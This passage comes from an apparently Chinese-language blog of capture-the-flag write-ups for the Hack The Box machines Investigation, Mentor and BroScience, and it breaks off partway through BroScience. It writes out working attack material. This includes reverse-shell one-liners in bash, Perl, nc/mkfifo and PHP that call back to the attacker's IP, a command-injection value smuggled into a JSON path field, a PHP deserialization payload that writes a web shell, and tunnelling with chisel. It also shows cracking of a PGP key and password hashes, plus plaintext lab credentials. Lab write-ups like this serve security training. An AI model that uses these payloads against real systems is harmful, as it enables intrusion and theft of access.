class="line">WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw</span><br><span class="line">8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh</span><br><span class="line">cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML</span><br><span class="line">qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j</span><br><span class="line">FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH</span><br><span class="line">FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE</span><br><span class="line">PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM</span><br><span class="line">FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L</span><br><span class="line">/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y</span><br><span class="line">q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+</span><br><span class="line">F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh</span><br><span class="line">S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM</span><br><span class="line">RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu</span><br><span class="line">TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20</span><br><span class="line">oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4</span><br><span class="line">V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n</span><br><span class="line">WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC</span><br><span class="line">6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB</span><br><span class="line">dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA</span><br><span class="line">OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW</span><br><span class="line">AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e</span><br><span class="line">qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi</span><br><span class="line">uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J</span><br><span class="line">CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT</span><br><span class="line">+PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+</span><br><span class="line">FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV</span><br><span class="line">jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G</span><br><span class="line">JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4</span><br><span class="line">VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB</span><br><span class="line">J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4</span><br><span class="line">V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P</span><br><span class="line">o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN</span><br><span class="line">=7Uo6</span><br><span class="line">-----END PGP PRIVATE KEY BLOCK-----&quot; &gt; hash</span><br><span class="line">gpg2john hash &gt; pass_hash</span><br><span class="line">john -w=/usr/share/wordlists/rockyou.txt pass_hash</span><br><span class="line">john --show pass_hash</span><br></pre></td></tr></table></figure>

<p>先将 左边的 key放到hash 文件中</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306150829391.png" alt="image-20230306150829391"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306151136621.png" alt="image-20230306151136621"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch pass</span><br><span class="line">passpie export pass</span><br><span class="line">cat pass</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306151227420.png" alt="image-20230306151227420"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:p7qfAZt4_A1xo_0x</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306151711565.png" alt="image-20230306151711565"></p>
<h1 id="Investigation"><a href="#Investigation" class="headerlink" title="Investigation"></a>Investigation</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306164156219.png" alt="image-20230306164156219"></p>
<p>这里存在文件上传</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306180725855.png" alt="image-20230306180725855"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306180807008.png" alt="image-20230306180807008"></p>
<p>发现传上的图片会被 ExifTool 给解析 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306180956086.png" alt="image-20230306180956086"></p>
<p>找到任意命令执行  由于没有回显 这里监听下流量</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306181042461.png" alt="image-20230306181042461"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;L2Jpbi9iYXNoIC1jICdiYXNoIC1pICY+IC9kZXYvdGNwLzEwLjEwLjE2LjI0LzU1NTUgMDwmMSc=&#x27;|base64 -d |bash|</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306190755132.png" alt="image-20230306190755132"></p>
<p>在 &#x2F;usr&#x2F;local&#x2F;investigation 目录发现 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306192405682.png" alt="image-20230306192405682"></p>
<p>通过nc将文件传下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 10000 &gt; &#x27;Windows Event Logs for Analysis.msg&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306193652170.png" alt="image-20230306193652170"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 10.10.16.24 10000 &lt;Windows\ Event\ Logs\ for\ Analysis.msg</span><br><span class="line">md5sum Windows\ Event\ Logs\ for\ Analysis.msg</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306193702065.png" alt="image-20230306193702065"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum &#x27;Windows Event Logs for Analysis.msg&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306193709326.png" alt="image-20230306193709326"></p>
<p>msg 文件查看器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://products.aspose.app/email/viewer/msg</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306195329497.png" alt="image-20230306195329497"></p>
<p>可以看到有一个附件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evtx-logs.zip</span><br></pre></td></tr></table></figure>

<p>这里用 网站下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.encryptomatic.com/viewer/</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306195426138.png" alt="image-20230306195426138"></p>
<p>通过windows的日志查看器打开</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306195809635.png" alt="image-20230306195809635"></p>
<p>通过筛选登录失败的 id 发现用户密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306210111045.png" alt="image-20230306210111045"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smorton:Def@ultf0r3nz!csPa$$</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306211803514.png" alt="image-20230306211803514"></p>
<p>通过scp 把这个文件下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp smorton@10.10.11.197:/usr/bin/binary .</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306212241110.png" alt="image-20230306212241110"></p>
<p>反编译一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306221056759.png" alt="image-20230306221056759"></p>
<p>这里总共需要三个参数 并且是root权限执行 第三个参数必须是 lDnxUysaQn</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream = fopen(argv[2], &quot;wb&quot;);</span><br><span class="line">  curl_easy_init();</span><br><span class="line">  curl_easy_setopt();</span><br><span class="line">  curl_easy_setopt();</span><br><span class="line">  curl_easy_setopt();</span><br><span class="line">  if ( (unsigned int)curl_easy_perform() )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Exiting... &quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = snprintf(0LL, 0LL, &quot;%s&quot;, argv[2]);</span><br><span class="line">  s = (char *)malloc(v5 + 1);</span><br><span class="line">  snprintf(s, v5 + 1, &quot;%s&quot;, argv[2]);</span><br><span class="line">  v6 = snprintf(0LL, 0LL, &quot;perl ./%s&quot;, s);</span><br><span class="line">  command = (char *)malloc(v6 + 1);</span><br><span class="line">  snprintf(command, v6 + 1, &quot;perl ./%s&quot;, s);</span><br></pre></td></tr></table></figure>

<p>重点在这里 这里首先把第二个参数 url 解析 并拿到相应的脚本接着使用perl去执行 也就是说我们需要启动一个 http服务在服务器上放上一个反弹shell的脚本 接着将第二个参数指向这个脚本就可以了 由于是在sudo中执行 因此</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/binary  http://10.10.16.24:8000/p.pl lDnxUysaQn</span><br></pre></td></tr></table></figure>

<p>这样执行时是三个参数 并且第二个参数值 脚本位置 第三个值是固定字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim p.pl</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306221549198.png" alt="image-20230306221549198"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use Socket;$i=&quot;10.10.16.24&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306221620470.png" alt="image-20230306221620470"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/binary  http://10.10.16.24:8000/p.pl lDnxUysaQn</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306222010486.png" alt="image-20230306222010486"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306222003192.png" alt="image-20230306222003192"></p>
<h1 id="Mentor"><a href="#Mentor" class="headerlink" title="Mentor"></a>Mentor</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307122646273.png" alt="image-20230307122646273"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http://mentorquotes.htb/&quot; -H &quot;Host: FUZZ.mentorquotes.htb&quot; -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -mc all -fc 302</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307122628445.png" alt="image-20230307122628445"></p>
<p>添加到host中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u=http://api.mentorquotes.htb/ -w=/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307184235239.png" alt="image-20230307184235239"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307184716315.png" alt="image-20230307184716315"></p>
<p>首先根据这里创建用户</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307193522246.png" alt="image-20230307193522246"></p>
<p>接着尝试登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307193544703.png" alt="image-20230307193544703"></p>
<p>这里拿到一个 jwt</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307193632318.png" alt="image-20230307193632318"></p>
<p>先尝试了几种jwt的攻击方式</p>
<p>这里看了别人的答案发现在扫描时启用了udp</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230307215812274.png" alt="image-20230307215812274"></p>
<p>使用 snmpbrute 来列出设备信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308133304213.png" alt="image-20230308133304213"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/SECFORCE/SNMP-Brute.git</span><br><span class="line">python3 snmpbrute.py -t 10.10.11.193</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308133247973.png" alt="image-20230308133247973"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk  -c internal -v2c 10.10.11.193 &gt; snmp.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308162926999.png" alt="image-20230308162926999"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kj23sadkj123as0-d213</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308163246133.png" alt="image-20230308163246133"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308163336407.png" alt="image-20230308163336407"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308163555951.png" alt="image-20230308163555951"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308164757127.png" alt="image-20230308164757127"></p>
<p>可以看到这里使用的json发送的数据并且字段有一个path</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308173026076.png" alt="image-20230308173026076"></p>
<p>简单试了一下 发现存在命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.24 5555 &gt;/tmp/f;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308180216182.png" alt="image-20230308180216182"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308180417352.png" alt="image-20230308180417352"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308180915049.png" alt="image-20230308180915049"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308181532465.png" alt="image-20230308181532465"></p>
<p>这里可以发现我们是在容器中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd app</span><br><span class="line">cat db.py</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310212126624.png" alt="image-20230310212126624"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.18/chisel </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310212138951.png" alt="image-20230310212138951"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x chisel</span><br><span class="line">./chisel server --port 9002 --reverse</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311110716423.png" alt="image-20230311110716423"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x chisel</span><br><span class="line">./chisel client -v 10.10.16.18:9002 R:5432:172.22.0.1:5432</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311103940348.png" alt="image-20230311103940348"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311114113391.png" alt="image-20230311114113391"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311114057979.png" alt="image-20230311114057979"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311114132267.png" alt="image-20230311114132267"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">53f22d0dfa10dce7e29cd31f4f953fd8</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311114839505.png" alt="image-20230311114839505"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc:123meunomeeivani</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311120843889.png" alt="image-20230311120843889"></p>
<p>linux信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/releases/tag/20230305</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311154932318.png" alt="image-20230311154932318"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/snmp/snmpd.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311154907671.png" alt="image-20230311154907671"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">james:SuperSecurePassword123__</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311155038332.png" alt="image-20230311155038332"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311155119727.png" alt="image-20230311155119727"></p>
<h1 id="BroScience"><a href="#BroScience" class="headerlink" title="BroScience"></a>BroScience</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308215935176.png" alt="image-20230308215935176"></p>
<p>打开发现几个 页面分别img id 都很奇怪 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308220025025.png" alt="image-20230308220025025"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/includes/img.php?path=barbell_squats.jpeg</span><br></pre></td></tr></table></figure>

<p>这里一看就是有文件读取</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308220228857.png" alt="image-20230308220228857"></p>
<p>include 页面发现目录遍历漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/includes/img.php?path=%25%32%65%25%32%65%25%32%66includes/db_connect.php</span><br></pre></td></tr></table></figure>

<p>当尝试 双url编码时发现可以读取文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308220249270.png" alt="image-20230308220249270"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308221253900.png" alt="image-20230308221253900"></p>
<p>这里通过读取img.php查看到读取逻辑 接着我们尝试读取&#x2F;etc&#x2F;passwd</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230308221237419.png" alt="image-20230308221237419"></p>
<p>这里我将代码下载下来 先读了一下代码 发现没啥问题 但是在用户登录之后存在反序列化漏洞</p>
<p>很明显在这里存在一个用户激活</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309142833420.png" alt="image-20230309142833420"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309142852380.png" alt="image-20230309142852380"></p>
<p>这里发现 生成随机数的种子是 time() 也就是说我们有时间就可以成功激活</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309144309590.png" alt="image-20230309144309590"></p>
<p>这里我们找到注册时的时间</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"><span class="variable">$time</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">srand</span>(<span class="variable">$time</span>);</span><br><span class="line">    <span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$date_str</span> = <span class="string">&#x27;14:30:38 9 March 2023&#x27;</span>;</span><br><span class="line"><span class="variable">$timestamp</span> = <span class="title function_ invoke__">strtotime</span>(<span class="variable">$date_str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$timestamp</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">generate_activation_code</span>(<span class="variable">$timestamp</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309144341034.png" alt="image-20230309144341034"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309144352542.png" alt="image-20230309144352542"></p>
<p>发现不行 我们将时间向后推一秒 网络延迟</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309144420682.png" alt="image-20230309144420682"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230309144438295.png" alt="image-20230309144438295"></p>
<p>发现激活了</p>
<p>利用反序列化写入shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;imgPath = <span class="string">&quot;/var/www/html/1.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tmp=<span class="string">&#x27;http://10.10.16.18/shell.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span>  = <span class="keyword">new</span> <span class="title class_">AvatarInterface</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310220320581.png" alt="image-20230310220320581"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $sock=fsockopen(&quot;10.10.16.18&quot;,9001);$proc=proc_open(&quot;sh&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310220347285.png" alt="image-20230310220347285"></p>
<p>触发反序列化</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310220404804.png" alt="image-20230310220404804"></p>
<p>触发shell</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310220416408.png" alt="image-20230310220416408"></p>
<p>将shell 转换成可交互的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/sh script -q /dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310221605248.png" alt="image-20230310221605248"></p>
<p>尝试连接数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/psql -h 127.0.0.1 -p 5432 -d broscience -U dbuser -W</span><br><span class="line">RangeOfMotion%777</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310221640734.png" alt="image-20230310221640734"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\dt 列出所有表</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310222238915.png" alt="image-20230310222238915"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310223118363.png" alt="image-20230310223118363"></p>
<p>hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13edad4932da9dbb57d9cd15b66ed104:NaCl</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 20 hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310224142273.png" alt="image-20230310224142273"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bill:iluvhorsesandgym</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230310224238065.png" alt="image-20230310224238065"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pspy64 -pf -i 1000 </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230311174047291.png" alt="image-20230311174047291"></p>
<p>这里找到这一条</p>
